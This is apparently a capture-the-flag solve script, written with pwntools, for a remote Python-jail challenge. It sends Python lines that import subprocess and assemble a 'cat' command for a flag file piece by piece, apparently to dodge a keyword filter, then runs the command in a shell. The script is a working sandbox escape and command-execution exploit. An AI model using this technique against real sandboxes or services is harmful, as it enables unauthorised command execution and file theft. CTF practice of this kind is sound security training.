from pwn import *

# Establish the target process
io = remote('143.198.219.171', 3333)

io.sendline(b'import subprocess')
io.sendline(b'import os')
io.sendline(b'slash = subprocess.run("pwd", shell=True, stdout=subprocess.PIPE)')
io.sendline(b'slash = slash.stdout.decode().strip()')
io.sendline(b'l = list()')
io.sendline(b'l.append("cat ")')
io.sendline(b'l.append("home")')
io.sendline(b'l.append(slash)')
io.sendline(b'l.append("ctf")')
io.sendline(b'l.append(slash)')
io.sendline(b'l.append("flag.txt")')

io.sendline(b'cmd = "".join(l)')
io.sendline(b'print()')
io.sendline(b'print(cmd)')

io.sendline(b'subprocess.run(cmd, shell=True)')

io.interactive()
